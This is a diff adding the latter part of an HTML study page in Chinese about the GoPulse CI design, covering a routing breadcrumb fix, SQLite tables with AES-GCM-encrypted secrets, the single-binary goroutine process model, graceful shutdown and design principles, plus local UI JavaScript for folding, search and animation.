+{ path: <span class="s">'/projects/:id/builds'</span>, meta: { crumb: [<span class="s">'项目'</span>, <span class="s">'web-api'</span>, <span class="s">'构建历史'</span>] } }
+{ path: <span class="s">'/builds/:n/diagnosis'</span>, meta: { crumb: [<span class="s">'项目'</span>, <span class="s">'web-api'</span>, <span class="s">'构建'</span>] } }
+
+<span class="c">// 顶栏组件读 route.meta.crumb 渲染</span>
+<span class="c">// ──▶ 每页天然正确，【不可能写错】，新增页面自动就有</span></pre></div></div><div class="blk"><h3 class="k-tip">为什么这样</h3><div class="tip"><div class="t">为什么这样设计</div>
+<strong>这是「用架构消灭一类 bug」的典型例子</strong> ——
+不是修好 13 处，而是让这 13 处<em>不可能出错</em>。<br><br>
+同样的思路还解决了：<br>
+&nbsp;&nbsp;· <strong>实例②</strong> 13 个页面都没有 <code>&lt;title&gt;</code> → 改为 <code>router.afterEach</code> 统一设置<br>
+&nbsp;&nbsp;· <strong>实例③</strong> 顶栏/侧栏/状态栏在 13 个文件里各复制一份 → 抽成 <code>components/layout/</code> 四个组件<br><br>
+而且这三条都写成了<strong>回归测试</strong>，以后改坏了会立刻被测出来。</div></div><div class="blk"><h3>另外两个值得一提的实现细节</h3><div class="tw"><table><thead><tr><th>细节</th><th>原理</th></tr></thead><tbody><tr><td>前端也有环形缓冲</td><td><span class='mono'>useLogStream</span> 里同样限制日志行数，超出丢最旧的 —— 长时间开着页面看日志，不能把浏览器内存吃光</td></tr><tr><td>组件卸载即停止轮询</td><td><span class='mono'>usePolling</span> 在 <span class='mono'>onUnmounted</span> 里清理定时器。不清理的话，你切走了页面后台还在每秒请求一次 —— <strong>内存泄漏 + 无效请求</strong></td></tr></tbody></table></div></div><div class="blk"><h3 class="k-warn">这个测试抓到的真 bug：侧栏高亮错位</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+<code>AppSidebar</code> 原本用「第一个前缀命中」匹配路径：</div></div><div class="blk"><h3>流程</h3><div class="flow">访问 /projects/1/secrets
+     │
+     ▼  遍历导航项
+'/projects' 先命中 startsWith ──▶ 返回 '/projects'
+     │
+     ▼
+侧栏高亮的是【项目列表】，不是【密钥管理】   ✗
+
+修法：改成【最长匹配】，并让 /builds/* 归到「构建历史」
+     （否则构建详情页没有任何高亮项）
+
+──▶ 这个 bug 是【测试自己抓出来的】，写代码时没意识到</div></div></div></section>
+<section class="station plan" id="s14"><div class="shead"><span class="snum">⑭</span><div class="stitle"><h2>数据是怎么存的</h2><p class="sub">8 张基础表 + 6 张 LOA 表，以及密钥加密的原理</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk"><h3>8 张基础表</h3><div class="tw"><table><thead><tr><th class="mono">表名</th><th>存什么</th><th>设计要点</th></tr></thead><tbody><tr><td class="mono">users</td><td>用户</td><td>bcrypt/argon2 密码哈希，<strong>不存明文</strong></td></tr><tr><td class="mono">projects</td><td>项目</td><td>仓库地址、检测类型、pipeline 覆盖、超时配置、<strong>git 凭据（加密）</strong></td></tr><tr><td class="mono">deploy_hosts</td><td>部署目标</td><td>地址、<strong>加密私钥</strong>、<strong>主机公钥指纹</strong>、健康检查配置</td></tr><tr><td class="mono">secrets</td><td>项目级环境变量</td><td>AES-GCM 加密成 BLOB</td></tr><tr><td class="mono">builds</td><td>构建</td><td>状态、触发源、SHA、<strong>pipeline 快照</strong>、诊断结果</td></tr><tr><td class="mono">build_events</td><td>状态迁移审计</td><td>from/to/reason/时间 —— 支持完整回放</td></tr><tr><td class="mono">deployments</td><td>部署记录</td><td>含 <span class='mono'>previous_deployment_id</span> <strong>回滚链</strong></td></tr><tr><td class="mono">log_chunks</td><td>日志分块</td><td>BLOB 可压缩，<span class='mono'>UNIQUE(build_id, seq)</span></td></tr></tbody></table></div></div><div class="blk"><h3>分工原则：什么数据放哪里</h3><div class="tw"><table><thead><tr><th>数据类型</th><th>存哪</th><th>为什么</th></tr></thead><tbody><tr><td>结构化元数据</td><td>SQLite</td><td>要查询、要索引、要事务</td></tr><tr><td>日志正文</td><td><span class='mono'>log_chunks</span> BLOB</td><td>大文本，一行一存会撑爆主表</td></tr><tr><td>构建产物（镜像）</td><td>Docker registry / 本地磁盘</td><td>二进制大文件不进数据库</td></tr><tr><td>密钥</td><td>数据库，但 <strong>AES-GCM 加密</strong></td><td>见下</td></tr></tbody></table></div></div><div class="blk">
+<p><strong>密钥加密的原理。</strong>AES-GCM 是「认证加密」，同时提供两个保证：</p></div><div class="blk"><h3>要点</h3><div class="kv"><div class="k">加密 (confidentiality)</div><div>没密钥看不懂</div><div class="k">认证 (integrity)</div><div>内容被改过<strong>会发现</strong>（GCM 自带认证标签，篡改即校验失败）</div></div></div><div class="blk"><h3 class="k-code">主密钥从哪来 —— 这是安全设计的关键</h3><div class="codewrap"><span class="lang">yaml</span><pre><span class="c"># config.yaml</span>
+<span class="k">crypto</span>:
+  master_key_env: <span class="s">"DEVOPS_MASTER_KEY"</span>    <span class="c"># ← 只是【变量名】，不是值</span>
+
+<span class="c"># 真正的密钥在环境变量里，由部署时注入：</span>
+<span class="c">#   export DEVOPS_MASTER_KEY="***"</span>
+<span class="c">#</span>
+<span class="c"># 【绝不写进数据库，绝不写进配置文件】</span></pre></div></div><div class="blk"><h3 class="k-tip">为什么要这样分离</h3><div class="tip"><div class="t">为什么这样设计</div>
+数据库文件可能被<strong>备份、被拷走、被误提交到 git</strong>。<br><br>
+如果密钥也在里面，等于<em>锁和钥匙放在同一个抽屉</em>。<br><br>
+分离之后：<strong>光有数据库文件，拿不到任何明文。</strong><br><br>
+这也是为什么 <code>DEPENDENCIES.md</code> 里所有敏感配置项都写成 <code>*_env</code>（存变量名）而不是存值。</div></div><div class="blk"><h3 class="k-code">为什么选 SQLite 而不是 PostgreSQL</h3><div class="codewrap"><span class="lang">text</span><pre>驱动：modernc.org/sqlite  ──▶ 【纯 Go 实现，无 CGO】
+
+这一点是决定性的：
+  · 有 CGO  → 交叉编译困难，Windows 上构建要装 gcc，单二进制分发变复杂
+  · 纯 Go   → GOOS=linux GOARCH=amd64 go build 一条命令出 Linux 二进制
+            ──▶ 真的能做到「scp 上去就能跑」
+
+小团队场景下单机 SQLite 完全够用（几万条构建记录毫无压力），
+需要时可通过 store 接口切换到 PostgreSQL（sqlc 支持双方言）。</pre></div></div></div></section>
+<section class="station plan" id="s15"><div class="shead"><span class="snum">⑮</span><div class="stitle"><h2>整个系统的进程模型</h2><p class="sub">为什么「单二进制」是这个项目最重要的卖点之一</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk"><h3>一个二进制 devopsd 内部</h3><div class="flow">一个二进制 devopsd
+│
+├── HTTP 服务器（每请求一个 goroutine）
+│     ├── REST API
+│     ├── SSE 日志流
+│     └── Webhook 接收
+│
+├── Scheduler goroutine（1 个）
+│     └── 循环：从 DB 原子认领 queued 任务 ──▶ 丢进 pool
+│
+├── Worker Pool（N 个，信号量限流，默认 4）
+│     └── 每个构建一个 goroutine
+│           ├── 检出代码（Go 侧，持凭据）
+│           ├── 起容器执行（Docker SDK）
+│           ├── 日志读取 goroutine
+│           ├── 日志落库 goroutine
+│           ├── 部署（SSH）
+│           └── 失败时：诊断 goroutine（调 LLM）
+│
+├── Reconciler goroutine（1 个）
+│     └── 定期：清理超时任务、恢复孤儿构建、删过期 workspace
+│
+└── Signal handler（1 个）
+      └── 收到 SIGTERM ──▶ 停止取新任务 ──▶ 等在跑的完成（宽限期 5 分钟）──▶ 退出</div></div><div class="blk"><h3>对比：部署一个 CI 系统需要什么</h3><div class="tw"><table><thead><tr><th></th><th class="mono">Jenkins</th><th class="mono">GoPulse</th></tr></thead><tbody><tr><td>运行时</td><td>需要装 Java（JRE/JDK）</td><td><span class='yes'>无（静态二进制）</span></td></tr><tr><td>数据库</td><td>通常另装一个</td><td><span class='yes'>一个 SQLite 文件</span></td></tr><tr><td>插件</td><td>装一堆插件，版本冲突是常态</td><td><span class='yes'>无插件概念</span></td></tr><tr><td>配置</td><td>web 界面点很多下 + Jenkinsfile</td><td><span class='yes'>一个 config.yaml</span></td></tr><tr><td>部署方式</td><td>war 包丢进 servlet 容器</td><td><span class='yes'><span class='mono'>scp devopsd &amp;&amp; ./devopsd</span></span></td></tr><tr><td>空闲内存</td><td>数百 MB 起</td><td><span class='yes'>对标 Woodpecker：server ≈100MB</span></td></tr></tbody></table></div></div><div class="blk"><h3 class="k-tip">优雅关闭为什么重要</h3><div class="tip"><div class="t">为什么这样设计</div>
+如果你 <code>kill</code> 掉进程时正好有构建在跑，<strong>容器会变成孤儿</strong> ——
+没人清理，占着磁盘和内存，跑上几十次就把机器塞满了。<br><br>
+收到 SIGTERM 后：停止接新任务 → 等在跑的完成（给 5 分钟宽限期）→ 清理 → 退出。<br>
+<em>这就是 <code>sync.WaitGroup</code> 在 Pool 里的用途。</em></div></div></div></section>
+<h2 style="font-size:18px;margin:38px 0 14px">归纳：三条贯穿全局的设计主线</h2><div class="mainlines"><div class="ml"><h3>主线一：宁可失败，不可静默错误</h3><pre>队列满       → 返回 503，不硬塞进内存
+检出不到 SHA → 标记失败，绝不悄悄用分支最新代码
+健康检查不过 → 回滚，绝不报告「部署成功」
+慢订阅者     → 丢日志行并计数，绝不阻塞构建
+诊断失败     → 不影响构建结果，绝不用假数据填充</pre><p>CI 系统的信任来自于「它不会骗你」。一次「显示成功但线上是坏的」就能让用户永远不再信任它。</p></div><div class="ml"><h3>主线二：机器做机械的事，人做判断的事</h3><pre>机器做：收集日志、裁剪、脱敏、调 LLM
+        匹配知识库、执行【已验证】的动作
+
+人做：  决定采纳哪个建议
+        判断「是代码错了还是测试该改」
+        批准破坏性操作
+
+而人做的判断会被沉淀成知识库
+   ──▶ 让机器下次能自动做
+       ↑ 这就是 LOA 动态演进</pre><p>「人为主导」不是能力不足的妥协，而是基于 ICSE'26 实证数据（29.46% 撤销率）的效率最优解。</p></div><div class="ml"><h3>主线三：一切可追溯</h3><pre>pipeline_json 快照 → 当时到底跑了什么命令
+build_events 审计  → 状态怎么变的、为什么
+log_chunks         → 完整的原始输出
+deployments 回滚链 → 上一个版本是哪个
+diagnosis 证据链   → AI 为什么这么说，行号可点开验证
+automation_audit   → 自动执行了什么、依据哪条规则</pre><p>这既是工程要求（出问题能查），也是学术要求 —— 论文里的实验数据全部从这些表来。</p></div></div><footer>GoPulse CI · 面向小型团队的轻量 CI/CD · 毕业设计学习材料<br>配套文档：ARCHITECTURE.md（架构设计）· HANDOVER.md（后端交接）· TODO.md（里程碑）· DEPENDENCIES.md（依赖选型）· openapi.yaml（API 契约）<br>演示用交互可视化见同目录 index.html</footer>
+</main>
+</div>
+<button class="top-link" id="totop" aria-label="回到顶部">↑</button>
+<script>
+(function(){
+  var $=function(s,c){return (c||document).querySelector(s)};
+  var $$=function(s,c){return Array.prototype.slice.call((c||document).querySelectorAll(s))};
+
+  /* ---- 折叠 ---- */
+  $$('.shead').forEach(function(h){
+    h.addEventListener('click',function(){h.parentNode.classList.toggle('fold')});
+  });
+  $('#btn-fold').addEventListener('click',function(){
+    var any=$$('.station:not(.fold)').length;
+    $$('.station').forEach(function(s){s.classList.toggle('fold',!!any)});
+    this.textContent=any?'全部展开':'全部折叠';
+  });
+
+  /* ---- 侧栏高亮 + 进度 ---- */
+  var stations=$$('.station'), links=$$('.nav a[data-t]');
+  var bar=$('#prog-fill'), pct=$('#prog-pct');
+  function onScroll(){
+    var y=window.scrollY+120, cur=stations[0];
+    stations.forEach(function(s){ if(s.offsetTop<=y) cur=s });
+    links.forEach(function(a){a.classList.toggle('on',a.dataset.t===cur.id)});
+    var h=document.documentElement.scrollHeight-window.innerHeight;
+    var p=h>0?Math.min(100,Math.round(window.scrollY/h*100)):0;
+    bar.style.width=p+'%'; pct.textContent=p+'%';
+    $('#totop').classList.toggle('show',window.scrollY>600);
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});
+  links.forEach(function(a){
+    a.addEventListener('click',function(e){
+      var t=document.getElementById(a.dataset.t);
+      if(!t)return;
+      e.preventDefault();
+      t.classList.remove('fold');
+      window.scrollTo({top:t.offsetTop-58,behavior:'smooth'});
+      history.replaceState(null,'','#'+a.dataset.t);
+    });
+  });
+
+  /* ---- 侧栏搜索 ---- */
+  $('#q').addEventListener('input',function(){
+    var q=this.value.trim().toLowerCase();
+    links.forEach(function(a){
+      var hit=!q||a.textContent.toLowerCase().indexOf(q)>=0;
+      a.classList.toggle('hide',!hit);
+    });
+    $$('.navgrp').forEach(function(g){
+      g.style.display=g.querySelectorAll('a:not(.hide)').length?'':'none';
+    });
+  });
+
+  /* ---- 全流程动画 ---- */
+  var nodes=$$('.pnode'), msg=$('#pmsg'), failBox=$('#chk-fail');
+  var timer=null, pbtn=$('#pbtn');
+  var FAIL_IDX=5;              /* nodes[5] = ⑥ 构建，失败剧本在这里中断 */
+  function reset(){
+    nodes.forEach(function(n){n.className='pnode'});
+    if(timer){clearTimeout(timer);timer=null}
+    pbtn.disabled=false; pbtn.textContent='▶ 播放全流程';
+  }
+  function done(text){
+    if(timer){clearTimeout(timer);timer=null}
+    pbtn.disabled=false; pbtn.textContent='▶ 重播';
+    msg.textContent=text;
+  }
+  function play(){
+    reset();
+    var willFail=failBox.checked, failIdx=willFail?FAIL_IDX:-1, i=0;
+    pbtn.disabled=true; pbtn.textContent='播放中…';
+    (function step(){
+      if(i>0){
+        var prev=nodes[i-1];
+        prev.classList.remove('act');
+        prev.classList.add((i-1)===failIdx?'fail':'ok');
+      }
+      if(i>0&&(i-1)===failIdx){
+        /* 构建失败：后续节点回到未激活态，链路终止于诊断 */
+        nodes.forEach(function(x,k){ if(k>i-1) x.className='pnode' });
+        done('阶段退出码 != 0 → 构建失败 ──▶ 转 ⑫ LOA 策略引擎诊断');
+        return;
+      }
+      if(i>=nodes.length){
+        done('部署成功 → 健康检查通过 → 状态 deployed');
+        return;
+      }
+      nodes[i].classList.add('act');
+      msg.textContent=nodes[i].dataset.msg||nodes[i].querySelector('.pt').textContent;
+      i++;
+      timer=setTimeout(step,1300);
+    })();
+  }
+  pbtn.addEventListener('click',play);
+  nodes.forEach(function(n){
+    n.addEventListener('click',function(e){
+      e.preventDefault();
+      if(timer)return;
+      var t=document.getElementById(n.dataset.goto);
+      if(t){t.classList.remove('fold');window.scrollTo({top:t.offsetTop-58,behavior:'smooth'});
+            history.replaceState(null,'','#'+n.dataset.goto)}
+    });
+  });
+
+  /* ---- 锚点直达 ---- */
+  if(location.hash){
+    var t=document.getElementById(location.hash.slice(1));
+    if(t){t.classList.remove('fold');setTimeout(function(){
+      window.scrollTo({top:t.offsetTop-58})},60)}
+  }
+  $('#totop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+  onScroll();
+})();
+</script>
+</body>
+</html>
